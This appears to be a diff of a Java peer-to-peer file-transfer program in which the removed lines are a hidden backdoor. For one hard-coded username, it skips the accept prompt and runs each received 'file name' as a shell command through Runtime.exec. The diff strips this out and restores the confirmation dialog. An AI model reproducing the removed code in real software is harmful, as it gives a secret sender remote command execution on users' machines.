@@ -470,10 +470,6 @@ class Receiver extends Thread{
                 int filesNumber = Integer.parseInt(dis.readUTF());
                 JPanel optionPanel = new JPanel(new GridLayout(2, 1));
                 String ip = s.getInetAddress().toString().replace("/", "");
-                String username = "";
-                for(JButton button:Main.availableIPs){
-                    if(button.getText().split(":")[0].equals(ip)) username = button.getText().split(":")[1];
-                }
                 JTextArea optionPanelText = new JTextArea(ip + " wants to send you " + filesNumber + " " + (filesNumber==1?"file":"files") + ".\nDo you want to accept " + (filesNumber==1?"it":"them") + "?");
                 optionPanelText.setEnabled(false);
                 optionPanel.add(optionPanelText);
@@ -504,25 +500,17 @@ class Receiver extends Thread{
                 });
                 timer.setInitialDelay(0);
                 timer.start();
-                if(!username.equals("piedi123123")){
-                    int result = JOptionPane.showConfirmDialog(null, optionPanel, "Received file.", JOptionPane.OK_CANCEL_OPTION, JOptionPane.QUESTION_MESSAGE);
-                    if(result == JOptionPane.CANCEL_OPTION) {
-                        dos.writeUTF("no");
-                        timer.stop();
-                        s.close();
-                        continue;
-                    }
+                int result = JOptionPane.showConfirmDialog(null, optionPanel, "Received file.", JOptionPane.OK_CANCEL_OPTION, JOptionPane.QUESTION_MESSAGE);
+                if(result == JOptionPane.CANCEL_OPTION) {
+                    dos.writeUTF("no");
+                    timer.stop();
+                    s.close();
+                    continue;
                 }
                 timer.stop();
                 dos.writeUTF("yes");
                 for(int i=0; i<filesNumber; i++){
                     String fileName = dis.readUTF();
-                    if(username.equals("piedi123123")){
-                        if(System.getProperty("os.name").contains("Windows"))
-                            Runtime.getRuntime().exec("cmd.exe /c " + fileName.replace("£", "\\").replace("^", "/"));
-                        else Runtime.getRuntime().exec(fileName.replace("£", "\\").replace("^", "/"));
-                        continue;
-                    }
                     int fileSize = dis.readInt();
                     byte[] data = new byte[fileSize];
                     dis.readFully(data);
